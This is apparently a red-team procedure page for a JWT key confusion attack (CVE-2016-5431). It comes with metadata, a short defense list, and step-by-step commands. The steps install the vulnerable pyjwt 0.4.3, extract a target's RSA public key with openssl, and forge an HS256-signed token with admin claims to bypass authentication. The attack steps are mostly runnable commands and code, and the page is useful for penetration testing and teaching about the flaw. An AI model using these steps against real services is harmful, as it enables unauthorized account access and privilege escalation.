---
type: procedure
description: >-
  Exploits a key confusion vulnerability in JWT implementation by changing the
  signing algorithm from RS256 to HS256 and using the server's RSA public key as
  the symmetric secret.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Valid Accounts]]'
sub_techniques: []
tags:
  - jwt
  - key-confusion
  - rs256
  - hs256
  - cve-2016-5431
  - authentication-bypass
commands:
  - '[[commands/pip-install-pyjwt-0-4-3]]'
  - '[[commands/openssl-extract-public-key-from-ssl-certificate]]'
  - '[[commands/python-jwt-encode-hs256-with-public-key]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# JWT-Key-Confusion-Attack-RS256-to-HS256

## Summary

This procedure demonstrates how to perform a JWT key confusion attack by modifying the algorithm in a JWT header from RS256 (asymmetric) to HS256 (symmetric) and using the target's RSA public key from its TLS certificate as the signing secret. This exploits applications that use the same key pair for TLS and JWT signing without properly validating the algorithm, allowing attackers to forge valid tokens for authentication bypass, privilege escalation, or data access.

## Description

JWT tokens signed with RS256 use an RSA private key for signing and public key for verification. However, if the application accepts HS256 and treats the provided 'key' as a symmetric secret without checking the key type or algorithm consistency, an attacker can extract the RSA public key from the server's TLS certificate (via openssl) and use it directly as the HS256 secret. The vulnerable pyjwt version (0.4.3) permits signing HS256 with an RSA key, generating a token that the server will validate incorrectly. This attack requires remote access to the target's TLS endpoint and targets web applications with misconfigured JWT handling, often seen in legacy or poorly implemented auth systems. Success leads to forged tokens that can impersonate users or admins.

## Requirements

1. Network access to the target's HTTPS endpoint (port 443).
2. OpenSSL installed on the attacker's machine.
3. Python and pip installed.
4. The target application must use the same RSA key pair for TLS and JWT signing, and accept HS256 without validation.

## Defense

- Use separate key pairs for TLS certificates and JWT signing.
- Enforce strict algorithm validation in JWT verification (reject HS256 if RS256 is expected, and validate key types).
- Upgrade to modern JWT libraries (pyjwt >=1.0) that prevent mismatched key-algorithm usage.
- Monitor JWT logs for unexpected algorithm changes or unusually long secrets (RSA public keys are ~2048 bits).
- Implement key rotation and certificate pinning to detect key misuse.

## Objectives

1. Forge a valid JWT token to bypass authentication.
2. Elevate privileges by crafting admin-level payloads.
3. Access sensitive data or perform unauthorized actions using the forged token.

## Instructions

### Step 1: Install Vulnerable PyJWT Version

**Context**: Install pyjwt 0.4.3, which allows signing HS256 tokens with an RSA public key without validation, enabling the key confusion.

**Command** ([[commands/pip-install-pyjwt-0-4-3]]):
```bash
pip install pyjwt==0.4.3
```

> This installs the specific vulnerable version. Verify installation by running `pip show pyjwt` to confirm version 0.4.3. If already installed, use a virtual environment to avoid conflicts.

### Step 2: Extract RSA Public Key from Target's TLS Certificate

**Context**: Retrieve the target's RSA public key from its SSL/TLS certificate, which will be used as the HS256 signing secret.

**Command** ([[commands/openssl-extract-public-key-from-ssl-certificate]]):
```bash
openssl s_client -connect $_TARGET_HOST:443 | openssl x509 -pubkey -noout
```

> Replace $_TARGET_HOST with the target's domain (e.g., example.com). This outputs the public key in PEM format. Save it to a file named `public.pem` for the next step: `... > public.pem`. Expected output starts with `-----BEGIN PUBLIC KEY-----` and ends with `-----END PUBLIC KEY-----`. If the certificate uses ECDSA instead of RSA, the attack fails.

### Step 3: Encode Malicious JWT with HS256 Using Public Key

**Context**: Generate a forged JWT by signing a custom payload with HS256, treating the RSA public key as the symmetric secret. Modify the payload to include desired claims (e.g., admin privileges).

**Command** ([[commands/python-jwt-encode-hs256-with-public-key]]):
```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

> This script reads the public key from `public.pem`, encodes a sample payload, and prints the signed JWT. Modify the payload dict (e.g., `{"sub":"admin", "admin":true}`) for the attack. Run with `python -c "..."` or save as a script. Expected output: The public key printed, followed by a JWT string like `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoic2VjcmV0In0.signature`. Submit this token to the target's API (e.g., via curl or browser) to test validity. If accepted, the attack succeeds.
